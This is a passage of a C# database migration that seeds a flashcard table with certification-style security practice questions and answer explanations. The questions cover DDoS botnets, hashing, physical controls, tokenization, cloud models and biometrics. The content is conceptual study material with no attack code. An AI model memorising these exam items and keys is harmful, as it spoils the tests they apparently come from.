                values: new object[] { 81, "\r\n81. C. Botnets are often used to launch DDoS attacks, with the\r\nattack coming from all the computers in the botnet\r\nsimultaneously. Phishing attacks attempt to get the user to give\r\nup information, click on a link, or open an attachment. Adware\r\nconsists of unwanted pop-up ads. A Trojan horse attaches\r\nmalware to a legitimate program.\r\n", 1, "\r\n81. Which of the following is commonly used in a distributed denial-of-service (DDoS) attack?\r\nA. Phishing\r\nB. Adware\r\nC. Botnet\r\nD. Trojan\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 82, "\r\n82. B. Amanda has discovered an insider threat. Insider threats can\r\nbe difficult to discover, as a malicious administrator or other\r\nprivileged user will often have the ability to conceal their actions\r\nor may actually be the person tasked with hunting for threats\r\nlike this! This is not a zero-day—no vulnerability was mentioned,\r\nthere was no misconfiguration since this was an intentional\r\naction, and encryption is not mentioned or discussed.\r\n", 1, "\r\n82. Amanda discovers that a member of her organization’s staff has installed a remote access\r\nTrojan on their accounting software server and has been accessing it remotely. What type of\r\nthreat has she discovered?\r\nA. Zero-day\r\nB. Insider threat\r\nC. Misconfiguration\r\nD. Weak encryption\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 112, "\r\n112. B. Adam should look for one or more threat feeds that match\r\nthe type of information he is looking for. Open threat feeds exist\r\nthat typically use STIX and TAXII to encode and transfer feed\r\ndata to multiple tools in an open format. None of the other feed\r\ntypes here would meet Adam’s needs.\r\n", 1, "\r\n112. Adam wants to download lists of malicious or untrustworthy IP addresses and domains\r\nusing STIX and TAXII. What type of service is he looking for?\r\nA. A vulnerability feed\r\nB. A threat feed\r\nC. A hunting feed\r\nD. A rule feed\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 901, "\r\n126. D. Public, private, sensitive, confidential, critical, and\r\nproprietary are all commonly used data classification labels for\r\nbusiness. Secret, however, is more commonly used in\r\ngovernment classification schemes.\r\n", 5, "\r\n126. Frank knows that businesses can use any classification labels they want, but he also knows\r\nthat there are a number of common labels in use. Which of the following is not a common\r\ndata classification label for businesses?\r\nA. Public\r\nB. Sensitive\r\nC. Private\r\nD. Secret\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 225, "\r\n8. C. Hash functions convert variable-length inputs into fixedlength\r\noutputs while minimizing the changes of multiple inputs,\r\nresulting in the same output (collisions). They also need to be\r\nfast to compute. Hashes should not be reversible; they are a oneway\r\nfunction!\r\n", 2, "\r\n8. Which of the following is not a critical characteristic of a hash function?\r\nA. It converts variable-length input into a fixed-length output.\r\nB. Multiple inputs should not hash to the same output.\r\nC. It must be reversible.\r\nD. It should be fast to compute.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 227, "\r\n10. A. Using both server-side execution and validation requires\r\nmore resources but prevents client-side tampering with the\r\napplication and data. For Olivia’s described needs, server-side\r\nexecution and validation is the best option.\r\n", 2, "\r\n10. Olivia wants to ensure that the code executed as part of her application is secure from\r\ntampering and that the application itself cannot be tampered with. Which of the following\r\nsolutions should she use and why?\r\nA. Server-side execution and validation, because it prevents data and application tampering\r\nB. Client-side validation and server-side execution to ensure client data access\r\nC. Server-side validation and client-side execution to prevent data tampering\r\nD. Client-side execution and validation, because it prevents data and application tampering\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 369, "\r\n152. C. Lighting serves a deterrent control, making potential\r\nmalicious actors feel like they may be observed without dark\r\nareas or shadows to hide in. It does not detect actions, it does\r\nnot compensate for the lack of another control, and although\r\nsome lights may turn on for motion, the primary purpose is to\r\ndeter malicious or unwanted actions.\r\n", 2, "\r\n152. What is the primary role of lighting in a physical security environment?\r\nA. It acts as a detective control.\r\nB. It acts as a reactive control.\r\nC. It acts as a deterrent control.\r\nD. It acts as a compensating control.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 370, "\r\n153. C. Edge computing places both data storage and computational\r\npower closer to where it is needed to save on bandwidth and to\r\nimprove the response of associated applications and services.\r\nHybrid computing combines local and cloud computing. Local\r\ncloud builds cloud infrastructure on local systems. Mist\r\ncomputing was made up for this question but may sound similar\r\nto fog computing, a term that has a similar meaning to edge\r\ncomputing, which uses local computation and storage that is\r\nthen Internet connected.\r\n", 2, "\r\n153. Dennis has deployed servers and storage to each of the facilities his organization runs to\r\nensure that scientific equipment can send and receive data at the speed that it needs to\r\nfunction. What computational design concept describes this?\r\nA. Hybrid cloud\r\nB. Mist computing\r\nC. Edge computing\r\nD. Local cloud\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 371, "\r\n154. D. Ben has deployed a tokenization scheme. Encryption would\r\nrequire the data to be decrypted to be used, and this is not\r\nmentioned. Hashing could be used to conceal values but does\r\nnot preserve the ability to work with the data. Masking modifies\r\ncontent to conceal personally identifiable information or other\r\nsensitive information.\r\n", 2, "\r\n154. Ben replaces sensitive data in his database with unique identifiers. The identifiers allow him\r\nto continue to take actions on the data without exposing the data itself. What type of solution\r\nhas he deployed?\r\nA. Masking\r\nB. Encryption\r\nC. Hashing\r\nD. Tokenization\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 372, "\r\n155. D. Fencing is both a useful deterrent because it discourages\r\nmalicious actors from accessing the grounds that Dana wants to\r\nprotect. It is also an example of a physical control. A visitor log\r\nis an administrative control and will not deter malicious actors.\r\nMotion detectors and cameras are examples of detective\r\ncontrols.\r\n", 2, "\r\n155. Dana wants to discourage potential malicious actors from accessing her facility. Which of\r\nthe following is both a deterrent and a physical control?\r\nA. A visitor log\r\nB. A motion detector\r\nC. A security camera\r\nD. Fences\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 373, "\r\n156. A. Adding a digital signature can ensure that both the message\r\nhas not been changed, and thus its integrity is intact, and that it\r\nsupports nonrepudiation by proving that the message is from\r\nthe sender who claims to have sent it.\r\n", 2, "\r\n156. What additional capabilities does adding a digital signature to an encrypted message\r\nprovide?\r\nA. Integrity and nonrepudiation\r\nB. Confidentiality and integrity\r\nC. Availability and nonrepudiation\r\nD. Confidentiality and availability\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 374, "\r\n157. B. Attestation processes request responsible managers or\r\nothers to validate that user entitlements or privileges are correct\r\nand match those that the user should have. Attestation is not an\r\nemployment verification process, although managers may\r\ndiscover that users who have left the organization still have\r\nrights as part of an attestation process. It does not require proof\r\nof identity or validation of security controls.\r\n", 2, "\r\n157. Megan has been asked to set up a periodic attestation process for accounts in her organization.\r\nWhat has she been asked to do?\r\nA. Validate that the users are still employed.\r\nB. Validate that the user’s rights and permissions are still correct.\r\nC. Require users to provide proof of identity.\r\nD. Validate security controls as part of a test.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 375, "\r\n158. B. A generator is the most appropriate answer to a multihour\r\noutage. Although a hot site would allow her organization to stay\r\nonline, the cost of a hot site is much higher than that of a\r\ngenerator. A PDU, or power distribution unit, is used to manage\r\nand distribute power, not to handle power outages. Finally, UPS\r\nsystems are not typically designed to handle long outages.\r\nInstead, they condition power and ensure that systems remain\r\nonline long enough for a generator to take over providing power.\r\n", 2, "\r\n158. Elaine wants to adopt appropriate response and recovery controls for natural disasters.\r\nWhat type of control should she use to prepare for a multihour power outage caused by\r\na tornado?\r\nA. A hot site\r\nB. A generator\r\nC. A PDU\r\nD. A UPS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 376, "\r\n159. A. A MAC supports authentication and integrity and is used to\r\nconfirm that messages came from the sender who is claimed to\r\nhave sent it and also ensure that recipients can validate the\r\nintegrity of the message. It does not help with confidentiality.\r\n", 2, "\r\n159. What does a message authentication code (MAC) do when used as part of a\r\ncryptographic system?\r\nA. It validates the message’s integrity and authenticity.\r\nB. It validates the message’s confidentiality and authenticity.\r\nC. It protects the message’s confidentiality and integrity.\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 377, "\r\n160. C. Inert gas systems are used to reduce the oxygen in a room\r\nwithout the hazard to staff that carbon dioxide systems use.\r\nBoth dry-pipe and pre-charge systems use water, which can\r\nharm delicate electronics.\r\n", 2, "\r\n160. Charles wants to put a fire suppression system in place in an area where highly sensitive\r\nelectronics are in use. What type of fire suppression system is best suited to this type of environment\r\nif Charles is concerned about potential harm to first responders or on-site staff?\r\nA. Pre-charge\r\nB. Dry pipe\r\nC. Inert gas\r\nD. Carbon dioxide\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 378, "\r\n161. C. Proximity card readers usually work using RFID (radio\r\nfrequency ID) technology. This allows cards to be used in\r\nproximity but without requiring a direct reader like a magnetic\r\nstripe. Neither biometrics or infrared are used for proximity\r\ncard readers.\r\n", 2, "\r\n161. What technology is typically used for proximity card readers?\r\nA. Magnetic stripe\r\nB. Biometrics\r\nC. RFID\r\nD. Infrared\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 379, "\r\n162. A. Digital signatures that use a sender’s private key provide\r\nnonrepudiation by allowing a sender to prove that they sent a\r\nmessage. Unless the sender’s private key has been compromised,\r\nsigning a message with their private key and allowing the\r\nrecipient to validate the signature using their public key ensures\r\nthat the sender sent the message in question. Longer keys don’t\r\nprove who a sender is, hashes are not reversible, and the public\r\nkey in use is the sender’s, not the recipient’s.\r\n", 2, "\r\n162. How does asymmetric encryption support nonrepudiation?\r\nA. Using digital signatures\r\nB. Using longer keys\r\nC. Using reversible hashes\r\nD. Using the recipient’s public key\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 368, "\r\n151. C. Elliptic curve encryption schemes allow the use of a shorter\r\nkey for the same strength that an RSA key would require,\r\nreducing the computational overhead required to encrypt and\r\ndecrypt data. That doesn’t mean you should use a short key;\r\ninstead, you must select a key length that matches your\r\nrequirements for resistance to brute force and other attacks.\r\nHashing is nonreversible and is not a form of encryption.\r\n", 2, "\r\n151. Mike knows that computational overheads are a concern for cryptographic systems. What\r\ncan he do to help limit the computational needs of his solution?\r\nA. Use hashes instead.\r\nB. Use short keys.\r\nC. Use elliptic curve encryption.\r\nD. Use the RSA algorithm.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 380, "\r\n163. B. Natural disasters, as well as man-made disasters, are\r\nprimary considerations for geographic security considerations.\r\nPlacing backup sites outside of the likely path or range of a\r\nsingle disaster helps ensure continuity of operations for\r\norganizations. MTR is the maximum time to restore, sprawl\r\navoidance is usually considered for virtual machines, and service\r\nintegration is a consideration for service architectures, not\r\ngeographical placement.\r\n", 2, "\r\n163. Olivia knows that she needs to consider geography as part of her security considerations.\r\nWhich of the following is a primary driver of geographical considerations for security?\r\nA. MTR\r\nB. Natural disasters\r\nC. Service integration\r\nD. Sprawl avoidance\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 382, "\r\n165. D. The key trade-off when considering resource constraints for\r\nencryption is that stronger encryption with longer keys requires\r\nmore computational time and resources. This means that it will\r\nbe slower and will consume more of the capacity of a system. A\r\nbalance between security and computational overhead needs to\r\nbe struck that matches the confidentiality needs of the data that\r\nis being handled or sent. Stronger encryption is usually slower,\r\nrunning out of entropy in the scenario described is not a typical\r\nconcern, and stronger encryption taking up significant amounts\r\nof drive space is also not a real issue in this scenario.\r\n", 2, "\r\n165. Derek wants to explain the concept of resource constraints driving security constraints when\r\nusing encryption. Which of the following descriptions best explains the trade-offs that he\r\nshould explain to his management?\r\nA. Stronger encryption requires more space on drives, meaning that the harder it is to\r\nbreak, the more storage you’ll need, driving up cost.\r\nB. Stronger encryption is faster, which means that using strong encryption will result in\r\nlower latency.\r\nC. Stronger encryption requires more entropy. This may reduce the overall security of the\r\nsystem when entropy is exhausted.\r\nD. Stronger encryption requires more computational resources, requiring a balance\r\nbetween speed and security.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 383, "\r\n166. C. Encrypting the message will ensure that it remains\r\nconfidential as long as only the recipient is able to decrypt it.\r\nHashing the message will result in the message not being\r\nrecoverable, whereas digitally signing it can provide\r\nnonrepudiation. Finally, quantum encryption algorithms and\r\nthe systems required to use them are not available today,\r\nmeaning Amanda won’t be able to use them—yet!\r\n", 2, "\r\n166. Amanda wants to ensure that the message she is sending remains confidential. What should\r\nshe do to ensure this?\r\nA. Hash the messages.\r\nB. Digitally sign the message.\r\nC. Encrypt the message.\r\nD. Use a quantum encryption algorithm.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 384, "\r\n167. C. In most cases, the major cloud service providers have more\r\nsecurity staff and a greater budget for security operations. This\r\nmeans they can invest more in security controls, staffing,\r\nmonitoring, and other activities. Using a cloud service provider\r\ncan help improve the overall security posture of an organization\r\nthat might not have the ability to have full-time or dedicated\r\nsecurity staff or expertise. At the same time, local staff will\r\nunderstand the business better and will usually have a faster\r\nresponse time to critical business needs.\r\n", 2, "\r\n167. What security advantage do cloud service providers like Amazon, Google, and Microsoft\r\nhave over local staff and systems for most small to mid-sized organizations?\r\nA. Better understanding of the organization’s business practices\r\nB. Faster response times\r\nC. More security staff and budget\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 385, "\r\n168. D. Network load balancers distribute traffic among systems,\r\nallowing systems to be added or removed, and making patching\r\nand upgrades easier by draining connections from systems and\r\nremoving them from the pool when work needs to be done on\r\nthem. They can also help monitor systems for performance,\r\nreport on issues, and ensure that loads match the capabilities of\r\nthe systems that they are in front of. Firewalls are used for\r\nsecurity, switches are a network device used to transfer traffic to\r\nthe correct system, and a horizontal scaler was made up for this\r\nquestion.\r\n", 2, "\r\n168. Tim wants to ensure that his web servers can scale horizontally during traffic increases,\r\nwhile also allowing them to be patched or upgraded without causing outages. What type of\r\nnetwork device should he deploy?\r\nA. A firewall\r\nB. A switch\r\nC. A horizontal scaler\r\nD. A network load balancer\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 386, "\r\n169. D. Protected cable distribution uses such controls as electrical,\r\nelectromagnetic, and even acoustic or air pressure sensors to\r\nensure that cables and distribution infrastructure are not\r\naccessed, allowing sensitive information to be transmitted in\r\nunencrypted form. The U.S. government identifies three\r\noptions: hardened carrier, alarmed carrier, and continuously\r\nviewed protected distribution systems. Shielded cables are used\r\nto prevent EMI.\r\n", 2, "\r\n169. Gabby wants to ensure that sensitive data can be transmitted in unencrypted form by using\r\nphysical safeguards. What type of solution should she implement?\r\nA. Shielded cables\r\nB. Armored cables\r\nC. Distribution lockdown\r\nD. Protected cable distribution\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 387, "\r\n170. B. Maureen is using the concept of audio steganography by\r\nhiding data inside an audio file in a way that conceals it from\r\ndetection. The other options are made up for this question.\r\n", 2, "\r\n170. Maureen conceals information she wants to transmit surreptitiously by modifying an MP3\r\nfile in a way that does not noticeably change how it sounds. What is this technique called?\r\nA. MP3crypt\r\nB. Audio steganography\r\nC. Audio hashing\r\nD. Honey MP3s\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 388, "\r\n171. B. Since Nicole is specifically worried about SMS pushes to cell\r\nphones, the most likely attack model is SIM (subscriber identity\r\nmodule) cloning, allowing attackers to obtain the authentication\r\ncodes sent to legitimate users. Attacks on a Voice over Internet\r\nProtocol (VoIP) system would typically help intercept SMS if it\r\nwas sent to VoIP phones, not cell phones (although forwarding\r\nis possible, but not mentioned here). Brute-force attacks are\r\nunlikely to succeed against SMS phone factors, and rainbow\r\ntables are used to crack hashed passwords.\r\n", 2, "\r\n171. Nicole is assessing risks to her multifactor authentication system. Which of the following is\r\nthe most likely threat model against short message service (SMS) push notifications to cell\r\nphones for her environment?\r\nA. Attacks on VoIP systems\r\nB. SIM cloning\r\nC. Brute-force attacks\r\nD. Rainbow tables\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 389, "\r\n172. C. Encryption is often used to protect data at rest. When data\r\nneeds to be accessed, it can be decrypted. Hashing is not\r\nreversible, meaning that it is not used for data storage when the\r\noriginal form is needed for processing. Comparing hashed\r\npasswords works because the password is presented again,\r\nrather than the password needing to be retrieved from storage.\r\nTLS is used to protect data in motion, and tokenization is a data\r\nsecurity technique that replaces sensitive data elements with\r\nnonsensitive elements that can still be processed in useful ways.\r\n", 2, "\r\n172. John wants to protect data at rest so that he can process it and use it as needed in its\r\noriginal form. What solution from the following list is best suited to this requirement?\r\nA. Hashing\r\nB. TLS\r\nC. Encryption\r\nD. Tokenization\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 390, "\r\n173. B. Nathaniel has created an air gap, a physical separation that\r\nwill require manual transport of files, patches, and other data\r\nbetween the two environments. This helps to ensure that\r\nattackers cannot access critical systems and that insiders cannot\r\nexport data from the environment easily. A demilitarized zone\r\n(DMZ) is a separate network segment or zone that is exposed to\r\nthe outside world or other lower trust area. A vault is a secured\r\nspace or room, but vaulting is not a term used on the Security+\r\nexam, and a hot aisle is the aisle where servers exhaust warm\r\nair.\r\n", 2, "\r\n173. Nathaniel has deployed the control infrastructure for his manufacturing plant without a network\r\nconnection to his other networks. What term describes this type of configuration?\r\nA. DMZ\r\nB. Air gap\r\nC. Vaulting\r\nD. A hot aisle\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 391, "\r\n174. A. Masking modifies content to conceal personally identifiable\r\ninformation (PII) or other sensitive information. Tokenization\r\nreplaces sensitive information with a nonsensitive alternative\r\nthat allows the data to still be processed in useful ways.\r\nEncryption would require the data to be decrypted to be used,\r\nand this is not mentioned. Hashing could be used to conceal\r\nvalues but does not preserve the ability to work with the data.\r\n", 2, "\r\n174. Naomi hides the original data in a Social Security number field to ensure that it is not\r\nexposed to users of her database. What data security technique does this describe?\r\nA. Masking\r\nB. Encryption\r\nC. Hashing\r\nD. Tokenization\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 392, "\r\n175. C. On-premises cloud computing is often called private cloud.\r\nNot all private clouds have to be on-site, because private clouds\r\ncould be deployed to a remote location like a third-party hosting\r\nfacility. Infrastructure as a service and platform as a service\r\nrefer to third-party hosting services, and hybrid cloud combines\r\nboth on-premises and cloud computing models.\r\n", 2, "\r\n175. Isaac wants to use on-premises cloud computing. What term describes this type of cloud\r\ncomputing solution?\r\nA. Infrastructure as a service\r\nB. Hybrid cloud\r\nC. Private cloud\r\nD. Platform as a service\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 381, "\r\n164. B. Although actual threats from drones and unmanned aerial\r\nvehicles (UAVs) are relatively rare for most organizations,\r\nplacing sensitive areas further inside a building will deter most\r\ncurrent generations of drones from entering or recording them.\r\nSecurity doors and other common obstacles will prevent most\r\nUAV or drone penetration that typical organizations will face.\r\nFences are easily bypassed by flying drones, biometric sensors\r\nwon’t stop a drone from hovering outside of a window, and\r\nFaraday cages might stop a drone from receiving commands if\r\nyou could get the drone inside first!\r\n", 2, "\r\n164. Scott wants to limit the impact of potential threats from UAVs. What physical security control\r\nis best suited to this purpose?\r\nA. Adding more fences\r\nB. Moving sensitive areas to the interior of a building\r\nC. Deploying biometric sensors\r\nD. Moving sensitive areas to Faraday cages\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 393, "\r\n176. C. The most likely threat to physical tokens is theft or loss\r\nresulting in access to the token. Cloning tokens might be\r\npossible if the token’s seed were known, but they are designed to\r\nprevent this from being reverse-engineered, meaning a\r\nsignificant breach of the vendor or similar issue would be\r\nrequired to cause an exposure. Brute force is not a realistic\r\nthreat against most token implementations, nor is algorithm\r\nfailure.\r\n", 2, "\r\n176. What is the primary threat model against physical tokens used for multifactor\r\nauthentication?\r\nA. Cloning\r\nB. Brute force\r\nC. Theft\r\nD. Algorithm failure\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 367, "\r\n150. C. The Linux kernel uses user-driven events like keystrokes,\r\nmouse movement, and similar events to generate randomness\r\n(entropy). The time of day is not random, user logins are\r\ntypically not frequent enough or random enough to be a useful\r\nsource of entropy, and network packet timing is not used for\r\nthis. If you encounter a question like this and don’t know where\r\nto start, consider what you know about entropy—it is\r\nrandomness, so you would be looking for the input that would\r\nhave the most randomness to it. Thus, you could rule out the\r\ntime of day, and likely user logins. After that, you might consider\r\nwhat could be controlled by an external party: network packets\r\nbeing sent to the system, and rule that out as a potential attack\r\nvector. That leaves keyboard input and mouse movement.\r\n", 2, "\r\n150. Dan knows that his Linux system generates entropy that is used for multiple functions,\r\nincluding encryption. Which of the following is a source of entropy for the Linux kernel?\r\nA. Time of day\r\nB. User login events\r\nC. Keystrokes and mouse movement\r\nD. Network packet timing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 365, "\r\n148. B. In the platform-as-a-service (PaaS) model, the consumer has\r\naccess to the infrastructure to create applications and host them.\r\nSoftware-as-a-service (SaaS) supplies a particular application;\r\ninfrastructure-as-a-service (IaaS) does not directly provide the\r\nability to create applications, although this distinction is quickly\r\nblurring; and IDaaS is identity-as-a-service.\r\n", 2, "\r\n148. Which cloud service model provides the consumer with the infrastructure to create applications\r\nand host them?\r\nA. SaaS\r\nB. PaaS\r\nC. IaaS\r\nD. IDaaS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 341, "\r\n124. C. Although user health data is a concern for the wearer of the\r\ndevice, unless the device is required by the organization, the\r\nuser’s health data is typically not an organizational security\r\nconcern. GPS location data, data exposure from data that is\r\ncopied to or accessible from the device, and the potential for\r\ndevices to act as unsecured wireless gateways to the\r\norganization’s network are all common security concerns for\r\nwearables. Lack of patching, lack of device encryption, and the\r\ninability to enforce compliance or security policies are also\r\ncommon concerns for wearables.\r\n", 2, "\r\n124. Which of the following is not a common organizational security concern for wearable\r\ndevices?\r\nA. GPS location data exposure\r\nB. Data exposure\r\nC. User health data exposure\r\nD. Insecure wireless connectivity\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 342, "\r\n125. D. A Faraday cage is a metal wire mesh designed to block\r\nelectromagnetic interference (EMI). None of the other answers\r\ndescribe what a Faraday cage is used for or capable of.\r\n", 2, "\r\n125. Tim is building a Faraday cage around his server room. What is the primary purpose of a\r\nFaraday cage?\r\nA. To regulate temperature\r\nB. To regulate current\r\nC. To block intrusions\r\nD. To block EMI\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 343, "\r\n126. B. Smartcards paired with electronic locks can be used to allow\r\nentrance into a building. The smartcard system can also store\r\ninformation about the user, and thus the system can log who\r\nenters the building. A security guard with a sign-in sheet would\r\nfunction, but there are many ways to subvert a sign-in sheet, and\r\na guard can be distracted or become inattentive. This makes\r\nsmartcard access a better solution. Guards are also more\r\nexpensive over time. A camera would record who enters but\r\nwould not control access. A nonemployee could enter the\r\nbuilding. An uncontrolled/supervised sign-in sheet would not be\r\nsecure.\r\n", 2, "\r\n126. You are working for a large company. You are trying to find a solution that will provide\r\ncontrolled physical access to the building and record every employee who enters the\r\nbuilding. Which of the following would be the best for you to implement?\r\nA. A security guard with a sign-in sheet\r\nB. Smartcard access using electronic locks\r\nC. A camera by the entrance\r\nD. A sign-in sheet by the front door\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 344, "\r\n127. D. Although electronic locks offer a number of advantages,\r\nincluding the ability to provide different codes or access to\r\ndifferent users and the ability to deprovision access, they also\r\nrequire power, whether in the form of a battery or constantly\r\nprovided power from a power source. That means that power\r\nloss can cause issues, either due to the lock remaining locked or\r\ndefaulting to an open state.\r\n", 2, "\r\n127. What concern causes organizations to choose physical locks over electronic locks?\r\nA. They provide greater security.\r\nB. They are resistant to bypass attempts.\r\nC. They are harder to pick.\r\nD. They do not require power.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 345, "\r\n128. A. Managing her organization’s IP address schema and usage\r\nwill allow Kara to identify unknown and potentially rogue\r\ndevices. IP addresses are not used to secure encryption keys, and\r\nmanaging a schema will not help prevent denial-of-service\r\nattacks. Keeping track of what IP addresses are in use can help\r\navoid IP address exhaustion, but this does not provide a direct\r\nsecurity advantage.\r\n", 2, "\r\n128. Kara has been asked to include IP schema management as part of her configuration\r\nmanagement efforts. Which of the following is a security advantage of IP schema configuration\r\nmanagement?\r\nA. Detecting rogue devices\r\nB. Using IP addresses to secure encryption keys\r\nC. Preventing denial-of-service attacks\r\nD. Avoiding IP address exhaustion\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 346, "\r\n129. C. Of the locks listed here, deadbolts are the most secure. The\r\nlocking bolt goes into the door frame, making it more secure.\r\nWhether a lock uses a key or combination does not change how\r\nsecure it is. Key-in-knob is a very common, and generally\r\nprovides less resistance to bypass than a deadbolt-based\r\nsolution. Finally, padlocks can be cut off with common bolt\r\ncutters.\r\n", 2, "\r\n129. Carole is concerned about security for her server room. She wants the most secure lock she\r\ncan find for the server room door. Which of the following would be the best choice for her?\r\nA. Combination lock\r\nB. Key-in-knob\r\nC. Deadbolt\r\nD. Padlock\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 347, "\r\n130. B. NIC teaming can provide greater throughput by sending\r\ntraffic through multiple network interface cards (NICs) while\r\nalso ensuring that loss of a card will not cause an outage, thus\r\nproviding fault tolerance.\r\n", 2, "\r\n130. Melissa wants to implement NIC teaming for a server in her datacenter. What two major\r\ncapabilities will this provide for her?\r\nA. Lower latency and greater throughput\r\nB. Greater throughput and fault tolerance\r\nC. Higher latency and fault tolerance\r\nD. Fault tolerance and lower latency\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 348, "\r\n131. A. False acceptance rate (FAR) is the rate at which the system\r\nincorrectly allows in someone it should not. This is clearly a\r\nsignificant concern. Any error is a concern, but the false\r\nrejection rate is less troublesome than the false acceptance rate.\r\nThe cross-over error rate (CER) is when the FAR and the false\r\nrejection rate (FRR) become equal. This indicates a consistent\r\noperation of the biometric system. The equal error rate is\r\nanother name for cross-over error rate.\r\n", 2, "\r\n131. Molly is implementing biometrics in her company. Which of the following should be her\r\nbiggest concern?\r\nA. FAR\r\nB. FRR\r\nC. CER\r\nD. EER\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
